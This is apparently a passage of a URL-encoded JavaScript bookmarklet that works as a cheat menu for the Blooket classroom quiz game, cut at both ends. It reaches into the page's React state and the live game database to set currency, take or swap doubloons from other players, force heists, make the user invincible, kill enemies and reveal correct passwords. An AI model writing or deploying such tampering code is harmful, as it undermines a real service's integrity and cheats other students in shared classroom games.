idth:30,height:30%7D),this.load.svg(%22uncommon-5%22,%22https://media.blooket.com/image/upload/v1658567785/Media/market/particles/triangle_light_green.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22uncommon-6%22,%22https://media.blooket.com/image/upload/v1658567785/Media/market/particles/serpentine_light_green.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22uncommon-7%22,%22https://media.blooket.com/image/upload/v1658567785/Media/market/particles/triangle_green.svg%22,%7Bwidth:30,height:30%7D);break;case%22rare%22:this.load.svg(%22rare-1%22,%22https://media.blooket.com/image/upload/v1658567765/Media/market/particles/square_light_blue.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22rare-2%22,%22https://media.blooket.com/image/upload/v1658567765/Media/market/particles/square_dark_blue.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22rare-3%22,%22https://media.blooket.com/image/upload/v1658567763/Media/market/particles/triangle_blue.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22rare-4%22,%22https://media.blooket.com/image/upload/v1658567763/Media/market/particles/serpentine_blue.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22rare-5%22,%22https://media.blooket.com/image/upload/v1658567763/Media/market/particles/triangle_light_blue.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22rare-6%22,%22https://media.blooket.com/image/upload/v1658567763/Media/market/particles/serpentine_light_blue.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22rare-7%22,%22https://media.blooket.com/image/upload/v1658567763/Media/market/particles/circle_dark_blue.svg%22,%7Bwidth:25,height:25%7D);break;case%22epic%22:this.load.svg(%22epic-1%22,%22https://media.blooket.com/image/upload/v1658790239/Media/market/particles/red.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22epic-2%22,%22https://media.blooket.com/image/upload/v1658790237/Media/market/particles/light_red.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22epic-3%22,%22https://media.blooket.com/image/upload/v1658790239/Media/market/particles/serpentine_red.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22epic-4%22,%22https://media.blooket.com/image/upload/v1658790239/Media/market/particles/serpentine_dark_red.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22epic-5%22,%22https://media.blooket.com/image/upload/v1658790237/Media/market/particles/triangle_red.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22epic-6%22,%22https://media.blooket.com/image/upload/v1658790237/Media/market/particles/triangle_light_red.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22epic-7%22,%22https://media.blooket.com/image/upload/v1658790237/Media/market/particles/circle_dark_red.svg%22,%7Bwidth:25,height:25%7D);break;case%22legendary%22:this.load.svg(%22legendary-1%22,%22https://media.blooket.com/image/upload/v1658567740/Media/market/particles/square_orange.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22legendary-2%22,%22https://media.blooket.com/image/upload/v1658567740/Media/market/particles/square_light_orange.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22legendary-3%22,%22https://media.blooket.com/image/upload/v1658567738/Media/market/particles/circle_orange.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22legendary-4%22,%22https://media.blooket.com/image/upload/v1658567738/Media/market/particles/serpentine_orange.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22legendary-5%22,%22https://media.blooket.com/image/upload/v1658567738/Media/market/particles/serpentine_light_orange.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22legendary-6%22,%22https://media.blooket.com/image/upload/v1658567738/Media/market/particles/circle_dark_orange.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22legendary-7%22,%22https://media.blooket.com/image/upload/v1658567738/Media/market/particles/triangle_dark_orange.svg%22,%7Bwidth:30,height:30%7D);break;case%22chroma%22:this.load.svg(%22chroma-1%22,%22https://media.blooket.com/image/upload/v1658790246/Media/market/particles/square_turquoise.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22chroma-2%22,%22https://media.blooket.com/image/upload/v1658790246/Media/market/particles/square_light_turquoise.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22chroma-3%22,%22https://media.blooket.com/image/upload/v1658790244/Media/market/particles/serpentine_dark_turquoise.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22chroma-4%22,%22https://media.blooket.com/image/upload/v1658790244/Media/market/particles/serpentine_turquoise.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22chroma-5%22,%22https://media.blooket.com/image/upload/v1658790244/Media/market/particles/triangle_turquoise.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22chroma-6%22,%22https://media.blooket.com/image/upload/v1658790244/Media/market/particles/triangle_light_turquoise.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22chroma-7%22,%22https://media.blooket.com/image/upload/v1658790244/Media/market/particles/circle_dark_turquoise.svg%22,%7Bwidth:25,height:25%7D)%7D%7Dcreate()%7Bh.scene=this,h.rarity=%22%22,h.particles=this.physics.add.group(%7BclassType:new%20r.Class(%7BExtends:r.GameObjects.Image,initialize:function()%7Br.GameObjects.Image.call(this,h.scene,0,0,%22uncommon-1%22),this.setDepth(3),this.lifespan=0%7D,spawn:function(e,t,o,a,r,n,i,s,l)%7Bthis.setTexture(l),this.setActive(!0),this.setVisible(!0),this.setPosition(e,t),this.setScale(o),this.targets=%5B%5D,h.scene.physics.velocityFromAngle(a,r,this.body.velocity),this.body.setGravityY(n),this.body.setAngularVelocity(i),this.lifespan=s%7D,update:function(e,t)%7Bthis.lifespan-=t,0%3Cthis.lifespan%7C%7C(this.setActive(!1),this.setVisible(!1))%7D%7D),runChildUpdate:!0%7D),this.nextParticle=0,this.numExplosions=0,this.game.events.on(%22start-particles%22,e=%3E%7Bh.rarity=e,this.numExplosions=%22Uncommon%22===e?75:%22Rare%22===e?100:-1%7D)%7Dupdate(e,t)%7Bconst%20o=m(%2274sb%22);function%20a(e)%7Bswitch(e)%7Bcase%22center%22:var%20t=Object(o.l)(-115,-65);return%7Bx:h.scene.cameras.main.worldView.width/2,y:h.scene.cameras.main.worldView.height/2,scale:Object(o.l)(.7,1),angle:t,velocity:Object(o.l)(600,750),gravity:700,angVelocity:(-90%3Ct?1:-1)*Object(o.l)(125,175),lifespan:2500%7D;case%22right-bottom%22:return%7Bx:h.scene.cameras.main.worldView.width,y:h.scene.cameras.main.worldView.height,scale:Object(o.l)(.7,1),angle:Object(o.l)(-160,-110),velocity:Object(o.l)(600,750),gravity:500,angVelocity:Object(o.l)(-175,-125),lifespan:2500%7D;case%22left-bottom%22:return%7Bx:0,y:h.scene.cameras.main.worldView.height,scale:Object(o.l)(.7,1),angle:Object(o.l)(-70,-20),velocity:Object(o.l)(600,750),gravity:500,angVelocity:Object(o.l)(125,175),lifespan:2500%7D;case%22top%22:return%7Bx:Object(o.l)(0,h.scene.cameras.main.worldView.width),y:-50,scale:Object(o.l)(.7,1),angle:90,velocity:Object(o.l)(0,50),gravity:700,angVelocity:Object(o.l)(-150,150),lifespan:2500%7D;case%22right-shower%22:return%7Bx:h.scene.cameras.main.worldView.width,y:Object(o.l)(0,h.scene.cameras.main.worldView.height),scale:Object(o.l)(.7,1),angle:Object(o.l)(-180,-130),velocity:Object(o.l)(600,750),gravity:500,angVelocity:Object(o.l)(-175,-125),lifespan:2500%7D;case%22left-shower%22:return%7Bx:0,y:Object(o.l)(0,h.scene.cameras.main.worldView.height),scale:Object(o.l)(.7,1),angle:Object(o.l)(-50,0),velocity:Object(o.l)(600,750),gravity:500,angVelocity:Object(o.l)(125,175),lifespan:2500%7D;case%22right-diamond%22:t=Object(o.l)(0,h.scene.cameras.main.worldView.height);return%7Bx:h.scene.cameras.main.worldView.width,y:t,scale:Object(o.l)(.7,1),angle:t%3Eh.scene.cameras.main.worldView.height/2?-150:-210,velocity:Object(o.l)(600,750),gravity:0,angVelocity:Object(o.l)(-175,-125),lifespan:2500%7D;case%22left-diamond%22:t=Object(o.l)(0,h.scene.cameras.main.worldView.height);return%7Bx:0,y:t,scale:Object(o.l)(.7,1),angle:t%3Eh.scene.cameras.main.worldView.height/2?-30:30,velocity:Object(o.l)(600,750),gravity:0,angVelocity:Object(o.l)(125,175),lifespan:2500%7D;default:return%7B%7D%7D%7Dif(h.rarity&&0!==this.numExplosions&&(this.nextParticle-=t,this.nextParticle%3C=0))%7Bswitch(h.rarity)%7Bcase%22Uncommon%22:for(let%20e=0;e%3C2;e++)%7Bvar%20r=h.particles.get();r&&r.spawn.apply(r,Object.values(a(%22center%22)).concat(%22uncommon-%22+Object(o.m)(1,8)))%7Dbreak;case%22Rare%22:for(var%20n=0;n%3C2;n++)%7Bvar%20i=h.particles.get();i&&i.spawn.apply(i,Object.values(a(n%252==0?%22left-bottom%22:%22right-bottom%22)).concat(%22rare-%22+Object(o.m)(1,8)))%7Dbreak;case%22Epic%22:for(var%20s=0;s%3C2;s++)%7Bvar%20l=h.particles.get();l&&l.spawn.apply(l,Object.values(a(s%252==0?%22left-shower%22:%22right-shower%22)).concat(%22epic-%22+Object(o.m)(1,8)))%7Dbreak;case%22Legendary%22:for(var%20c=0;c%3C3;c++)%7Bvar%20d=h.particles.get();d&&d.spawn.apply(d,Object.values(a(%22top%22)).concat(%22legendary-%22+Object(o.m)(1,8)))%7Dbreak;case%22Chroma%22:for(var%20u=0;u%3C3;u++)%7Bvar%20p=h.particles.get();p&&p.spawn.apply(p,Object.values(a(u%252==0?%22left-diamond%22:%22right-diamond%22)).concat(%22chroma-%22+Object(o.m)(1,8)))%7D%7Dthis.nextParticle=20,0%3Cthis.numExplosions&&(this.numExplosions=Math.max(this.numExplosions-1,0))%7D%7D%7Dreturn%20function(e)%7Bvar%20t=document.createElement(%22iframe%22);document.body.append(t),window.alert=t.contentWindow.alert.bind(window),window.prompt=t.contentWindow.prompt.bind(window),t.remove(),%22/market%22==window.location.pathname?(t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D,t.setState(%7BloadingPack:!1,openPack:!0,unlockedBlook:e,newUnlock:!0,game:%7Btype:r.WEBGL,parent:%22phaser-market%22,width:%22100%25%22,height:%22100%25%22,scale:%7Bmode:r.Scale.NONE,autoCenter:r.Scale.CENTER_BOTH%7D,transparent:!0,physics:%7Bdefault:%22arcade%22%7D,scene:new%20n(o%5Be%5D.rarity)%7D,canOpen:!0%7D)):alert(%22This%20can%20only%20be%20ran%20on%20the%20market%20page!%22)%7D%7Dcatch%7B%7D%7D()%7D%5D,voyage:%5B%7Bname:%22Max%20Levels%22,description:%22Maxes%20out%20all%20islands%20and%20your%20boat%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.setState(%7BislandLevels:new%20Array(e.state.islandLevels.length).fill(5)%7D,e.updateBoatLevel)%7D%7D,%7Bname:%22Set%20Doubloons%22,description:%22Sets%20Doubloons%22,inputs:%5B%7Bname:%22Amount%22,type:%22number%22%7D%5D,run:function(e)%7Bvar%20t=document.createElement(%22iframe%22),t=(document.body.append(t),window.prompt=t.contentWindow.prompt.bind(window),t.remove(),Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner)%5B%22stateNode%22%5D;t.setState(%7Bdoubloons:e%7D),t.props.liveGameController.setVal(%7Bpath:%60c/$%7Bt.props.client.name%7D/d%60,val:e%7D)%7D%7D,%7Bname:%22Start%20Heist%22,description:%22Starts%20a%20heist%20on%20someone%22,inputs:%5B%7Bname:%22Player%22,type:%22options%22,options:()=%3E%7Blet%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;return%20new%20Promise(t=%3Ee.props.liveGameController._liveApp?e.props.liveGameController.getDatabaseVal(%22c%22,e=%3Ee&&t(Object.keys(e))):t(%5B%5D))%7D%7D%5D,run:function(a)%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.prompt=e.contentWindow.prompt.bind(window),e.remove();let%20r=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;r.props.liveGameController.getDatabaseVal(%22c%22,function(e)%7Bvar%20t,o,e=Object.entries(e%7C%7C%7B%7D).reduce((e,%5Bt,o%5D)=%3E(t==r.props.client.name&&e.push(%7Bname:t,blook:o.b,doubloons:o.d%7C%7C0%7D),e),%5B%5D);0===e.length?(r.questionsToAnswer=1,r.randomQ()):(%7Bname:e,blook:t,doubloons:o%7D=e.find(e=%3Ee.name==a)%7C%7Ce.sort((e,t)=%3Et.doubloons-e.doubloons)%5B0%5D,r.setState(%7Bstage:%22heist%22,heistInfo:%7Bname:e,blook:t%7D,prizeAmount:Math.max(1e3,o)%7D))%7D)%7D%7D,%7Bname:%22Swap%20Doubloons%22,description:%22Swaps%20Doubloons%20with%20someone%22,inputs:%5B%7Bname:%22Player%22,type:%22options%22,options:()=%3E%7Blet%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;return%20new%20Promise(t=%3Ee.props.liveGameController._liveApp?e.props.liveGameController.getDatabaseVal(%22c%22,e=%3Ee&&t(Object.keys(e))):t(%5B%5D))%7D%7D%5D,run:async%20function(t)%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.prompt=e.contentWindow.prompt.bind(window),e.remove();let%20o=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e=Object.entries(await%20new%20Promise(e=%3Eo.props.liveGameController.getDatabaseVal(%22c%22,e))).sort((e,t)=%3Et%5B1%5D.d-e%5B1%5D.d).filter(e=%3Ee%5B0%5D!=o.props.client.name),e=e.find(e=%3Ee%5B0%5D==t)%7C%7Ce%5B0%5D;o.props.liveGameController.setVal(%7Bpath:%22c/%22+o.props.client.name,val:%7Bb:o.props.client.blook,d:e%5B1%5D.d,tat:e%5B0%5D+%22:%22+(e%5B1%5D.d-o.state.doubloons)%7D%7D),o.setState(%7Bdoubloons:e%5B1%5D.d%7D)%7D%7D,%7Bname:%22Take%20Doubloons%22,description:%22Takes%20Doubloons%20from%20someone%22,inputs:%5B%7Bname:%22Player%22,type:%22options%22,options:()=%3E%7Blet%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;return%20new%20Promise(t=%3Ee.props.liveGameController._liveApp?e.props.liveGameController.getDatabaseVal(%22c%22,e=%3Ee&&t(Object.keys(e))):t(%5B%5D))%7D%7D%5D,run:async%20function(t)%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.prompt=e.contentWindow.prompt.bind(window),e.remove();let%20o=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e=Object.entries(await%20new%20Promise(e=%3Eo.props.liveGameController.getDatabaseVal(%22c%22,e))).sort((e,t)=%3Et%5B1%5D.d-e%5B1%5D.d).filter(e=%3Ee%5B0%5D!=o.props.client.name),e=e.find(e=%3Ee%5B0%5D==t)%7C%7Ce%5B0%5D;o.setState(%7Bdoubloons:o.state.doubloons+e%5B1%5D.d%7D),o.props.liveGameController.setVal(%7Bpath:%22c/%22+o.props.client.name,val:%7Bb:o.props.client.blook,d:e%5B1%5D.d,tat:e%5B0%5D+%22:%22+e%5B1%5D.d%7D%7D)%7D%7D%5D,brawl:%5B%7Bname:%22Double%20Enemy%20XP%22,description:%22Doubles%20enemy%20XP%20drop%20value%22,run:function()%7Bfor(const%20o%20of%20Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(e=%3Ee.callbackContext?.toString().includes(%22invulnerableTime%22)))%7Bvar%20t=o.object2;let%20e=t.classType.prototype.start;t.classType.prototype.start=function()%7Be.apply(this,arguments),this.val*=2%7D,t.children.entries.forEach(e=%3Ee.val*=2)%7D%7D%7D,%7Bname:%22Half%20Enemy%20Speed%22,description:%22Makes%20enemies%20move%202x%20slower%22,run:function()%7Bfor(const%20o%20of%20Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(e=%3Ee.callbackContext?.toString().includes(%22invulnerableTime%22)))%7Bvar%20t=o.object2;let%20e=t.classType.prototype.start;t.classType.prototype.start=function()%7Be.apply(this,arguments),this.speed*=.5%7D,t.children.entries.forEach(e=%3Ee.speed*=.5)%7D%7D%7D,%7Bname:%22Instant%20Kill%22,description:%22Sets%20all%20enemies%20health%20to%201%22,run:function()%7Bfor(const%20o%20of%20Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(e=%3Ee.callbackContext?.toString().includes(%22invulnerableTime%22)))%7Bvar%20t=o.object2;let%20e=t.classType.prototype.start;t.classType.prototype.start=function()%7Be.apply(this,arguments),this.hp=1%7D,t.children.entries.forEach(e=%3Ee.hp=1)%7D%7D%7D,%7Bname:%22Invincibility%22,description:%22Makes%20you%20invincible%22,run:function()%7Bfor(const%20e%20of%20Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(e=%3Ee.callbackContext?.toString().includes(%22invulnerableTime%22)))e.collideCallback=()=%3E%7B%7D%7D%7D,%7Bname:%22Magnet%22,description:%22Pulls%20all%20xp%20towards%20you%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state.game.scene.physics.world.colliders._active.find(e=%3Ee.collideCallback?.toString().includes(%22magnetTime%22)).collideCallback(%7Bactive:!0%7D,%7Bactive:!0,setActive()%7B%7D,setVisible()%7B%7D%7D)%7D%7D,%7Bname:%22Max%20Current%20Abilities%22,description:%22Maxes%20out%20all%20your%20current%20abilities%22,run:function()%7Bconst%20o=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;for(var%5Bt,a%5Dof%20Object.entries(o.state.abilities))for(let%20e=0;e%3C10-a;e++)o.state.game.scene.game.events.emit(%22level%20up%22,t,o.state.abilities%5Bt%5D++);o.setState(%7Blevel:o.state.game.scene.level=%5B1,3,5,10,15,25,35%5D.sort((e,t)=%3EMath.abs(e-o.state.level)-Math.abs(t-o.state.level))%5B0%5D-1%7D)%7D%7D,%7Bname:%22Next%20Level%22,description:%22Skips%20to%20the%20next%20level%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D,%7Bobject1:t,object2:o%7D=e.state.game.scene.physics.world.colliders._active.find(e=%3Ee.collideCallback?.toString().includes('emit(%22xp%22'));o.get().spawn(t.x,t.y,(1===(o=e.state.level)?1:o%3C5?5:o%3C10?10:o%3C20?20:o%3C30?30:o%3C40?40:o%3C50?50:100)-e.xp)%7D%7D,%7Bname:%22Remove%20Obstacles%22,description:%22Removes%20all%20rocks%20and%20obstacles%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state.game.scene.physics.world.bodies.entries.forEach(e=%3E%7Btry%7Be.gameObject.frame.texture.key.includes(%22obstacle%22)&&e.gameObject.destroy()%7Dcatch%7B%7D%7D)%7D%7D,%7Bname:%22Kill%20Enemies%22,description:%22Kills%20all%20current%20enemies%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state.game.scene.physics.world.bodies.entries.forEach(e=%3Ee?.gameObject?.receiveDamage?.(e.gameObject.hp,1))%7D%7D,%7Bname:%22Reset%20Health%22,description:%22Resets%20health%20and%20gives%20invincibility%20for%203%20seconds%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state.game.scene.game.events._events.respawn.fn()%7D%7D%5D,cafe:%5B%7Bname:%22Max%20Items%22,description:%22Maxes%20out%20items%20in%20the%20shop%20(Only%20usable%20in%20the%20shop)%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.alert=e.contentWindow.alert.bind(window),e.remove(),%22/cafe/shop%22!==window.location.pathname?alert(%22This%20can%20only%20be%20run%20in%20the%20shop%22):(e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D,e.setState(%7Bitems:Object.fromEntries(Object.entries(e.state.items).map(e=%3E%5Be%5B0%5D,5%5D))%7D))%7D%7D,%7Bname:%22Remove%20Customers%22,description:%22Skips%20the%20current%20customers%20(Not%20usable%20in%20the%20shop)%22,run:function()%7Bconst%20o=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;o.state.customers.forEach((e,t)=%3EObject.keys(e).length&&o.removeCustomer(t,!0))%7D%7D,%7Bname:%22Reset%20Abilities%22,description:%22Resets%20used%20abilities%20in%20shop%20(Only%20usable%20in%20the%20shop)%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.alert=e.contentWindow.alert.bind(window),e.remove(),%22/cafe/shop%22!==window.location.pathname?alert(%22This%20can%20only%20be%20run%20in%20the%20shop%22):(e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D,e.setState(%7Babilities:Object.fromEntries(Object.entries(e.state.abilities).map(e=%3E%5Be%5B0%5D,5%5D))%7D))%7D%7D,%7Bname:%22Set%20Cash%22,description:%22Sets%20cafe%20cash%22,inputs:%5B%7Bname:%22Amount%22,type:%22number%22%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.setState(%7BcafeCash:e%7D),t.props.liveGameController.setVal(%7Bpath:%22c/%22+t.props.client.name,val:%7Bb:t.props.client.blook,ca:e%7D%7D)%7D%7D,%7Bname:%22Stock%20Food%22,description:%22Stocks%20all%20food%20to%2099%20(Not%20usable%20in%20the%20shop)%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.alert=e.contentWindow.alert.bind(window),e.remove(),%22/cafe%22!==window.location.pathname?alert(%22This%20can't%20be%20run%20in%20the%20shop%22):(e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D,e.setState(%7Bfoods:e.state.foods.map(e=%3E(%7B...e,stock:99,level:5%7D))%7D))%7D%7D%5D,crypto:%5B%7Bname:%22Choice%20ESP%22,description:%22Shows%20what%20each%20choice%20will%20give%20you%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(()=%3E%7Bvar%20e,t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D,t=t.state.choices%5B0%5D%5B%22text%22%5D,o=document.querySelector(%22%5Bclass%5E=styles__feedbackContainer___%5D%22);o.children.length%3C=4&&((e=document.createElement(%22div%22)).style.color=%22white%22,e.style.fontFamily=%22Inconsolata,Helvetica,monospace,sans-serif%22,e.style.fontSize=%222em%22,e.style.display=%22flex%22,e.style.justifyContent=%22center%22,e.style.marginTop=%22675px%22,e.innerText=t,o.append(e))%7D,50))%7D%7D,%7Bname:%22Password%20ESP%22,description:%22Highlights%20the%20correct%20password%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(()=%3E%7Blet%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode%5B%22state%22%5D;%22hack%22==t.stage&&%5B...document.querySelector(%22div%5Bclass%5E=styles__buttonContainer%5D%22).children%5D.forEach(e=%3E%7Be.innerText!=t.correctPassword&&(e.style.outlineColor=%22rgba(255,%2064,%2064,%200.8)%22,e.style.backgroundColor=%22rgba(255,%2064,%2064,%200.8)%22,e.style.textShadow=%220%200%201px%20#f33%22)%7D)%7D,50))%7D%7D,%7Bname:%22Always%20Triple%22,description:%22Always%20get%20triple%20crypto%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(()=%3EObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bchoices:%5B%7Btype:%22mult%22,val:3,rate:.075,blook:%22Brainy%20Bot%22,text:%22Triple%20Crypto%22%7D%5D%7D),50))%7D%7D,%7Bname:%22Auto%20Guess%22,description:%22Automatically%20guess%20the%20correct%20password%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(()=%3E%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode%5B%22s